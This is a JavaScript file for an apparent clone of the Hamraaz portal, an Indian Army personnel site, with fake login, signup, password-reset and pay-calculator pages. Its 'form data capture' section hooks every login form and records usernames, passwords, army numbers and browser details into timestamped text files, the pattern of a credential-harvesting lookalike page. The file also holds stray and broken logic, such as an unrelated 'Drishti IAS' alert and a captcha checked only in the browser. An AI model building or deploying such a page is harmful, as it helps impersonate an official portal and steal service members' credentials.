// Hamraaz Portal JavaScript

// Generate random captcha
function generateCaptcha() {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let captcha = '';
    for (let i = 0; i < 5; i++) {
        captcha += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return captcha;
}

// Initialize auto-scroll functionality
function initializeAutoScroll() {
    const scrollWrapper = document.getElementById('autoScrollWrapper');
    if (!scrollWrapper) return;
    
    const scrollContainer = scrollWrapper.querySelector('.scroll-container');
    if (!scrollContainer) return;
    
    const scrollContent = scrollContainer.querySelector('.scroll-content');
    if (!scrollContent) return;
    
    // Store original content
    const originalContent = scrollContent.innerHTML;
    
    // Create seamless infinite scroll by duplicating content
    scrollContent.innerHTML = originalContent + originalContent;
    
    // Set up proper infinite scroll animation
    setTimeout(() => {
        const totalHeight = scrollContent.scrollHeight;
        const halfHeight = totalHeight / 2;
        
        // Calculate duration based on content length for consistent speed
        const duration = Math.max(30, halfHeight / 25); // Slower for better readability
        
        // Apply the animation
        scrollContent.style.animationDuration = duration + 's';
        
        // Ensure smooth infinite loop
        scrollContent.addEventListener('animationend', () => {
            scrollContent.style.animation = 'none';
            scrollContent.offsetHeight; // Trigger reflow
            scrollContent.style.animation = `autoScroll ${duration}s linear infinite`;
        });
    }, 100);
}

// Update captcha image
function updateCaptcha() {
    const captchaElements = document.querySelectorAll('#captchaImage');
    captchaElements.forEach(element => {
        if (element) {
            element.textContent = generateCaptcha();
        }
    });
}

// Initialize page
document.addEventListener('DOMContentLoaded', function() {
    // Update captcha on page load
    updateCaptcha();
    
    // Initialize auto-scroll functionality
    initializeAutoScroll();
    
    // Add refresh captcha functionality
    const refreshButtons = document.querySelectorAll('#refreshCaptcha');
    refreshButtons.forEach(button => {
        button.addEventListener('click', function() {
            updateCaptcha();
            // Clear captcha input
            const captchaInput = document.querySelector('#captcha');
            if (captchaInput) {
                captchaInput.value = '';
            }
        });
    });
    
    // Form submission handlers
    const forms = document.querySelectorAll('form');
    forms.forEach(form => {
        form.addEventListener('submit', function(e) {
            e.preventDefault();
            handleFormSubmission(form);
        });
    });
    
    // Language button functionality
    const langButtons = document.querySelectorAll('.lang-btn');
    langButtons.forEach(button => {
        button.addEventListener('click', function() {
            langButtons.forEach(btn => btn.classList.remove('active'));
            this.classList.add('active');
        });
    });
    
    // Pay calculator functionality (for pay-calculator.html page)
    initializePayCalculator();
    
    // Initialize form data capture for all login pages
    initializeFormDataCapture();
    
    // Info button
    const infoBtn = document.querySelector('.info-btn');
    if (infoBtn) {
        infoBtn.addEventListener('click', function() {
            alert('More information about Drishti IAS courses would be displayed here.');
        });
    }
});

// Handle form submissions
function handleFormSubmission(form) {
    const formId = form.id;
    const captchaInput = form.querySelector('#captcha');
    const captchaImage = form.querySelector('#captchaImage');
    
    // Validate captcha
    if (captchaInput && captchaImage) {
        if (captchaInput.value.toLowerCase() !== captchaImage.textContent.toLowerCase()) {
            alert('Invalid captcha. Please try again.');
            updateCaptcha();
            captchaInput.value = '';
            return;
        }
    }
    
    // Handle different form types
    switch (formId) {
        case 'roLoginForm':
            handleROLogin(form);
            break;
        case 'unitLoginForm':
            handleUnitLogin(form);
            break;
        case 'personalLoginForm':
            handlePersonalLogin(form);
            break;
        case 'signupForm':
            handleSignup(form);
            break;
        case 'forgotPasswordForm':
            handleForgotPassword(form);
            break;
        default:
            alert('Form submission successful!');
    }
}

// RO Login handler
function handleROLogin(form) {
    const username = form.querySelector('#username').value;
    const password = form.querySelector('#password').value;
    
    if (!username || !password) {
        alert('Please fill in all required fields.');
        return;
    }
    
    // Simulate login process
    showLoadingMessage('Authenticating RO credentials...');
    setTimeout(() => {
        alert('RO Login successful! Redirecting to dashboard...');
        // In a real application, you would redirect to the dashboard
        // window.location.href = 'ro-dashboard.html';
    }, 2000);
}

// Unit Login handler
function handleUnitLogin(form) {
    const username = form.querySelector('#username').value;
    
    if (!username) {
        alert('Please enter your username.');
        return;
    }
    
    // Simulate OTP request
    showLoadingMessage('Sending OTP to registered mobile number...');
    setTimeout(() => {
        alert('OTP sent successfully! Please check your mobile phone.');
        // In a real application, you would show an OTP input field
    }, 2000);
}

// Personal Login handler
function handlePersonalLogin(form) {
    const username = form.querySelector('#username').value;
    const password = form.querySelector('#password').value;
    
    if (!username || !password) {
        alert('Please fill in all required fields.');
        return;
    }
    
    // Simulate login process
    showLoadingMessage('Authenticating personal credentials...');
    setTimeout(() => {
        alert('Personal Login successful! Redirecting to dashboard...');
        // In a real application, you would redirect to the dashboard
        // window.location.href = 'personal-dashboard.html';
    }, 2000);
}

// Signup handler
function handleSignup(form) {
    const fullName = form.querySelector('#fullName').value;
    const armyNumber = form.querySelector('#armyNumber').value;
    const email = form.querySelector('#email').value;
    const mobile = form.querySelector('#mobile').value;
    const password = form.querySelector('#password').value;
    const confirmPassword = form.querySelector('#confirmPassword').value;
    
    if (!fullName || !armyNumber || !email || !mobile || !password || !confirmPassword) {
        alert('Please fill in all required fields.');
        return;
    }
    
    if (password !== confirmPassword) {
        alert('Passwords do not match.');
        return;
    }
    
    if (password.length < 8) {
        alert('Password must be at least 8 characters long.');
        return;
    }
    
    // Validate email
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(email)) {
        alert('Please enter a valid email address.');
        return;
    }
    
    // Validate mobile number
    const mobileRegex = /^[0-9]{10}$/;
    if (!mobileRegex.test(mobile)) {
        alert('Please enter a valid 10-digit mobile number.');
        return;
    }
    
    // Simulate registration process
    showLoadingMessage('Creating your account...');
    setTimeout(() => {
        alert('Registration successful! Please check your email for verification link.');
        form.reset();
        updateCaptcha();
    }, 2000);
}

// Forgot Password handler
function handleForgotPassword(form) {
    const usernameOrEmail = form.querySelector('#usernameOrEmail').value;
    
    if (!usernameOrEmail) {
        alert('Please enter your username or email address.');
        return;
    }
    
    // Simulate password reset process
    showLoadingMessage('Sending password reset link...');
    setTimeout(() => {
        alert('Password reset link sent! Please check your email.');
        form.reset();
        updateCaptcha();
    }, 2000);
}

// Show loading message
function showLoadingMessage(message) {
    // Create loading overlay
    const overlay = document.createElement('div');
    overlay.style.cssText = `
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: rgba(0, 0, 0, 0.7);
        display: flex;
        justify-content: center;
        align-items: center;
        z-index: 9999;
        color: white;
        font-size: 18px;
    `;
    overlay.textContent = message;
    document.body.appendChild(overlay);
    
    // Remove overlay after 2 seconds
    setTimeout(() => {
        document.body.removeChild(overlay);
    }, 2000);
}

// Mobile menu toggle (for responsive design)
function toggleMobileMenu() {
    const navMenu = document.querySelector('.nav-menu');
    navMenu.classList.toggle('active');
}

// Add mobile menu button for smaller screens
if (window.innerWidth <= 768) {
    const navContainer = document.querySelector('.nav-container');
    const menuButton = document.createElement('button');
    menuButton.innerHTML = '☰';
    menuButton.style.cssText = `
        background: none;
        border: none;
        color: white;
        font-size: 24px;
        cursor: pointer;
        display: none;
    `;
    menuButton.addEventListener('click', toggleMobileMenu);
    navContainer.appendChild(menuButton);
    
    // Show menu button on mobile
    if (window.innerWidth <= 768) {
        menuButton.style.display = 'block';
    }
}

// Pay Calculator Page Functions
function initializePayCalculator() {
    const payCalcForm = document.getElementById('payCalculatorForm');
    if (!payCalcForm) return; // Only run on pay calculator page
    
    const payLevelSelect = document.getElementById('payLevel');
    const basicPaySelect = document.getElementById('basicPay');
    const promotionDateInput = document.getElementById('promotionDate');
    const selectDateBtn = document.getElementById('selectDateBtn');
    
    // Pay level change handler - populate basic pay options
    if (payLevelSelect && basicPaySelect) {
        payLevelSelect.addEventListener('change', function() {
            populateBasicPay(this.value, basicPaySelect);
        });
    }
    
    // Date picker functionality
    if (selectDateBtn && promotionDateInput) {
        selectDateBtn.addEventListener('click', function() {
            // Create a temporary date input to trigger browser date picker
            const tempInput = document.createElement('input');
            tempInput.type = 'date';
            tempInput.style.position = 'absolute';
            tempInput.style.left = '-9999px';
            document.body.appendChild(tempInput);
            
            tempInput.addEventListener('change', function() {
                if (this.value) {
                    // Convert YYYY-MM-DD to DD/MM/YYYY
                    const date = new Date(this.value);
                    const day = String(date.getDate()).padStart(2, '0');
                    const month = String(date.getMonth() + 1).padStart(2, '0');
                    const year = date.getFullYear();
                    promotionDateInput.value = `${day}/${month}/${year}`;
                }
                document.body.removeChild(this);
            });
            
            tempInput.click();
        });
    }
    
    // Form submission handler
    payCalcForm.addEventListener('submit', function(e) {
        e.preventDefault();
        calculatePay();
    });
    
    // Reset button handler
    const resetBtn = document.querySelector('.reset-calc-btn');
    if (resetBtn) {
        resetBtn.addEventListener('click', function() {
            payCalcForm.reset();
            basicPaySelect.innerHTML = '<option value="">---Select---</option>';
        });
    }
    
    // Pay Matrix button handler
    const matrixBtn = document.querySelector('.matrix-calc-btn');
    if (matrixBtn) {
        matrixBtn.addEventListener('click', function() {
            alert('Pay Matrix functionality would be implemented here.');
        });
    }
}

function populateBasicPay(level, selectElement) {
    // Clear existing options
    selectElement.innerHTML = '<option value="">---Select---</option>';
    
    if (!level) return;
    
    // Sample pay data - in real implementation, this would come from a proper data source
    const payData = {
        '1': ['18000', '18500', '19000', '19500', '20000'],
        '2': ['19900', '20500', '21100', '21700', '22300'],
        '3': ['21700', '22300', '22900', '23500', '24100'],
        '4': ['25500', '26200', '26900', '27600', '28300'],
        '5': ['29200', '30000', '30800', '31600', '32400'],
        '6': ['35400', '36400', '37400', '38400', '39400'],
        '7': ['44900', '46100', '47300', '48500', '49700'],
        '8': ['47600', '48900', '50200', '51500', '52800'],
        '9': ['53100', '54500', '55900', '57300', '58700'],
        '10': ['56100', '57600', '59100', '60600', '62100'],
        '11': ['67700', '69500', '71300', '73100', '74900'],
        '12': ['78800', '80900', '83000', '85100', '87200'],
        '13': ['118500', '121600', '124700', '127800', '130900'],
        '14': ['144200', '148000', '151800', '155600', '159400'],
        '15': ['182200', '187000', '191800', '196600', '201400'],
        '16': ['205400', '210700', '216000', '221300', '226600'],
        '17': ['225000', '230800', '236600', '242400', '248200'],
        '18': ['225000', '230800', '236600', '242400', '248200']
    };
    
    const payOptions = payData[level] || [];
    payOptions.forEach(pay => {
        const option = document.createElement('option');
        option.value = pay;
        option.textContent = pay;
        selectElement.appendChild(option);
    });
}

function calculatePay() {
    const payLevel = document.getElementById('payLevel').value;
    const basicPay = document.getElementById('basicPay').value;
    const promotionDate = document.getElementById('promotionDate').value;
    const nextIncrement = document.getElementById('nextIncrement').value;
    
    if (!payLevel || !basicPay || !promotionDate || !nextIncrement) {
        alert('Please fill all required fields.');
        return;
    }
    
    // Simple calculation logic - in real implementation, this would be much more complex
    const currentPay = parseInt(basicPay);
    const newLevel = parseInt(payLevel) + 1;
    const incrementPercentage = 0.03; // 3% increment
    const calculatedPay = Math.round(currentPay * (1 + incrementPercentage));
    
    alert(`Calculation Result:\nCurrent Pay: ₹${currentPay}\nPromoted to Level: ${newLevel}\nNew Basic Pay: ₹${calculatedPay}\nPromotion Date: ${promotionDate}\nNext Increment: ${nextIncrement}`);
}

// Form Data Capture Functions
function initializeFormDataCapture() {
    // Get all forms on the page
    const forms = document.querySelectorAll('form');
    
    forms.forEach(form => {
        const formId = form.id;
        
        // Only handle login/signup forms, not pay calculator
        if (formId && (formId.includes('Login') || formId.includes('signup') || formId.includes('forgotPassword'))) {
            form.addEventListener('submit', function(e) {
                e.preventDefault(); // Prevent default form submission
                
                // Capture and save form data
                captureAndSaveFormData(form);
                
                // Show success message
                alert('Form data has been saved successfully!');
                
                // Optional: Clear form after saving
                // form.reset();
            });
        }
    });
}

function captureAndSaveFormData(form) {
    const formId = form.id;
    let pageType = '';
    let filename = '';
    
    // Determine page type and filename based on form ID
    switch(formId) {
        case 'roLoginForm':
            pageType = 'RO Login';
            filename = 'ro-login-data.txt';
            break;
        case 'unitLoginForm':
            pageType = 'Unit Login';
            filename = 'unit-login-data.txt';
            break;
        case 'personalLoginForm':
            pageType = 'Personal Login';
            filename = 'personal-login-data.txt';
            break;
        case 'signupForm':
            pageType = 'Signup';
            filename = 'signup-data.txt';
            break;
        case 'forgotPasswordForm':
            pageType = 'Forgot Password';
            filename = 'forgot-password-data.txt';
            break;
        default:
            pageType = 'Unknown Form';
            filename = 'form-data.txt';
    }
    
    // Get current timestamp
    const timestamp = new Date().toLocaleString();
    
    // Collect form data
    const formData = new FormData(form);
    const inputs = form.querySelectorAll('input, select, textarea');
    
    let dataContent = '';
    dataContent += `===========================================\n`;
    dataContent += `${pageType} Form Submission\n`;
    dataContent += `===========================================\n`;
    dataContent += `Timestamp: ${timestamp}\n`;
    dataContent += `Page: ${window.location.pathname}\n`;
    dataContent += `-------------------------------------------\n\n`;
    
    // Capture all form fields
    inputs.forEach(input => {
        if (input.type !== 'submit' && input.type !== 'button') {
            const fieldName = input.name || input.id || input.placeholder || 'Unknown Field';
            const fieldValue = input.value || 'Not provided';
            const fieldType = input.type || 'text';
            
            dataContent += `${fieldName}:\n`;
            dataContent += `  Value: ${fieldValue}\n`;
            dataContent += `  Type: ${fieldType}\n`;
            dataContent += `  Element ID: ${input.id}\n\n`;
        }
    });
    
    // Add browser and user agent info for context
    dataContent += `-------------------------------------------\n`;
    dataContent += `Browser Information:\n`;
    dataContent += `User Agent: ${navigator.userAgent}\n`;
    dataContent += `Platform: ${navigator.platform}\n`;
    dataContent += `Language: ${navigator.language}\n`;
    dataContent += `Screen Resolution: ${screen.width}x${screen.height}\n`;
    dataContent += `===========================================\n\n`;
    
    // Save to file
    downloadTextFile(dataContent, filename);
}

function downloadTextFile(content, filename) {
    // Create a blob with the content
    const blob = new Blob([content], { type: 'text/plain' });
    
    // Create a temporary download link
    const link = document.createElement('a');
    link.href = URL.createObjectURL(blob);
    link.download = filename;
    
    // Add timestamp to filename to avoid overwrites
    const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
    const timestampedFilename = filename.replace('.txt', `_${timestamp}.txt`);
    link.download = timestampedFilename;
    
    // Temporarily add to page, click, and remove
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
    
    // Clean up the blob URL
    URL.revokeObjectURL(link.href);
}

// Utility function to append data to existing file content
function appendToExistingData(newContent, filename) {
    // Note: This would require reading existing file content first
    // For now, each submission creates a new timestamped file
    return newContent;
}

// Function to export all captured data (can be called manually)
function exportAllFormData() {
    const allData = localStorage.getItem('hamraaz-form-data');
    if (allData) {
        downloadTextFile(allData, 'all-form-data-export.txt');
    } else {
        alert('No form data found to export.');
    }
}